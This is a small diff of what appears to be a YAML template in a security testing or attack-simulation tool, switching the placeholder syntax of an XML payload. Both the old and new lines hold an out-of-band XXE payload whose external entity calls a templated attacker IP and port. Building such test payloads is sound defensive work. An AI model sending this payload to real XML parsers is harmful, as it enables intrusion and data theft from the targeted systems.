@@ -7,5 +7,5 @@ metadata:
 
 content: |
   <?xml version="1.0" encoding="UTF-8"?>
-  <!DOCTYPE foo [ <!ENTITY ent SYSTEM "http://<%=$(esh variables/attacker_ip)%>:<%=$(esh variables/delivery_outbound_port)%>/outofbounds"> ]>
+  <!DOCTYPE foo [ <!ENTITY ent SYSTEM "http://{{ attacker_ip }}:{{ delivery_outbound_port }}/outofbounds"> ]>
   <bar>&ent;</bar>
